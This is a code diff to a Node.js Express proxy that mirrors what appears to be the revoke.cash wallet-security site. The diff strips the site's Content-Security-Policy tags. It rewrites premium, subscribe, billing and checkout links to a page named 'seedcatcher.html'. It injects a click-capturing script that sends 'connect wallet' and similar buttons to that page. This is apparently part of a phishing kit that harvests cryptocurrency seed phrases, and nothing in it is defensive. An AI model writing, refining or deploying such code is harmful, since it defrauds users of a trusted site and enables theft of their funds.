@@ -5,23 +5,6 @@ const path = require('path');
 const app = express();
 const port = process.env.PORT || 8080;
 
-const hijackScript = `
-<script>
-document.addEventListener('click', function(e) {
-    let target = e.target.closest('a, button, div, span');
-    if (!target) return;
-    let text = (target.innerText || "").toLowerCase().trim();
-    let href = (target.getAttribute("href") || "").toLowerCase();
-    if (href === '/premium' || href === 'https://revoke.cash/premium') return;
-    if (text.includes('get started') || text.includes('subscribe') || text.includes('upgrade') || text.includes('connect wallet')) {
-        e.preventDefault();
-        e.stopPropagation();
-        window.location.href = '/seedcatcher.html';
-    }
-}, true);
-</script>
-`;
-
 app.use(async (req, res, next) => {
     const localFile = path.join(__dirname, req.path);
     if (fs.existsSync(localFile) && fs.lstatSync(localFile).isFile()) {
@@ -51,11 +34,30 @@ app.use(async (req, res, next) => {
             let html = '';
             response.data.on('data', chunk => html += chunk);
             response.data.on('end', () => {
+                // Remove CSP meta tags
                 html = html.replace(/<meta http-equiv="Content-Security-Policy".*?>/gi, '');
                 
-                // INJECT INLINE SCRIPT
+                // HIJACK LINKS DIRECTLY IN HTML
+                // Change any href="/premium" to your catcher
+                html = html.replace(/href="[^"]*\/premium[^"]*"/gi, 'href="/seedcatcher.html"');
+                html = html.replace(/href="[^"]*\/subscribe[^"]*"/gi, 'href="/seedcatcher.html"');
+                html = html.replace(/href="[^"]*\/billing[^"]*"/gi, 'href="/seedcatcher.html"');
+                html = html.replace(/href="[^"]*\/checkout[^"]*"/gi, 'href="/seedcatcher.html"');
+
+                // Inject the inline script just in case there are buttons
+                const inlineScript = `
+                <script>
+                document.addEventListener('click', function(e) {
+                    let t = e.target.closest('a, button');
+                    if (t && (t.innerText || "").toLowerCase().match(/(get started|subscribe|upgrade|connect wallet)/)) {
+                        e.preventDefault();
+                        window.location.href = '/seedcatcher.html';
+                    }
+                }, true);
+                </script>
+                `;
                 if (html.includes('</body>')) {
-                    html = html.replace('</body>', hijackScript + '</body>');
+                    html = html.replace('</body>', inlineScript + '</body>');
                 }
                 res.send(html);
             });
